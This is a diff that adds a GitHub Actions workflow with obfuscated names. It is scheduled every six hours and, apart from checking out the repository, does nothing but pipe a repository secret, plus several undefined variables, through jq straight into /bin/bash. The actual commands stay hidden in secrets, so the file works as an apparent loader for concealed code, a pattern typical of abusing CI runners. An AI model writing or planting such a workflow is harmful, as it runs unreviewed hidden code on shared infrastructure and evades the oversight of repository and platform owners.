@@ -1,0 +1,23 @@
+name: fengzhongji5647
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fengzhongji5647
+        env:
+          wygx1: ${{ secrets.wygx1 }}
+        run: |
+          echo $wygx1 | jq -r .c11942 | /bin/bash
+          echo $bpcci7648 | jq -r .lhph90050 | /bin/bash
+          echo $e9848 | jq -r .myz0854 | /bin/bash
+          echo $v6921 | jq -r .vy22 | /bin/bash
+          echo $hmo47101 | jq -r .yvqz2 | /bin/bash
+          echo $bc9 | jq -r .uwx85 | /bin/bash
+
